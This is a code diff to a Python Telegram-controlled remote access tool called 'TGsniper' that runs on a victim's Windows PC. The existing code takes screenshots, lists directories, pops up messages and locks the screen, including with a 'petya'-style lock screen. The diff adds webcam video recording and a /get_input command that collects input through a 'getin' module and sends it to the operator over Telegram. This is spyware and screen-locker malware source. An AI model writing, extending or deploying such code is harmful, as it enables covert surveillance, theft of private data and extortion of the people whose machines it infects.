@@ -1,3 +1,4 @@
+import time
 import telebot
 import pyautogui
 import os
@@ -8,8 +9,15 @@ import lock_screen
 from datetime import datetime
 import socket
 import petya_screen_topmost
+import cv2
+import getin
 
-token = '0_0'
+f = open('mtocen.txt', 'r')
+
+token = f.read()
+
+f.close()
+
 try:
     f = open('id.txt', 'r')
     id = f.read() #1919930125
@@ -38,22 +46,50 @@ os.remove("new_screen.png")
 
 @bot.message_handler(content_types=['text'])
 def get_text_messages(message):
+    def take_a_video():
+        cap = cv2.VideoCapture(0)
+        cap.set(cv2.CAP_PROP_FPS, 30)
+        cap.set(cv2.CAP_PROP_FRAME_WIDHT, 1280)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+        
+        codec = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter("vtosend.avi", codec, 30.0, (1280, 720))
+
+        while True:
+            ret, frame = cap.read()
+            out.write(frame)
+
+            time.sleep(10)
+
+            break
+        out.release()
+        cap.release()
     def send_msg(text):
         print(message.from_user.id)
         subprocess.call(f'msg.exe * "{text}"')
     def send(message, text):
         bot.send_message(message.from_user.id, text)
     text = message.text
+    def getinput():
+        getin.run()
+        ftpr = open('comment.txt', 'r')
+        send(message, ftpr.read())
+        ftpr.close()
+        os.remove('comment.txt')
     if text == "/start":
         send(message, "Бот успешно запущен!")
     elif text == "/help":
         send(message, '''/help - lol
-    /screen - take a photo
-    /last_20_screens - take 20 photos
-    /message <text>- send message
-    /list_dir <dir> - list selected dir
-    /set_id userid - set user id to default
-    /exit - exit from TGsniper
+/screen - take a photo
+/last_20_screens - take 20 photos
+/message <text>- send message
+/list_dir <dir> - list selected dir
+/set_id userid - set user id to default
+/lockscreen - block with RGB lights
+/lockscreenpass - lock with random password
+/petya - lock with petya screen
+/get_input
+/exit - exit from TGsniper
         ''')
     elif text == "/info":
         send(message, "Error info data!")
@@ -105,5 +141,7 @@ def get_text_messages(message):
         f.close()
     elif text == "/petya":
         petya_screen_topmost.run()
+    elif text == "/get_input":
+        getinput()
         
 bot.polling(none_stop=True, interval=0)
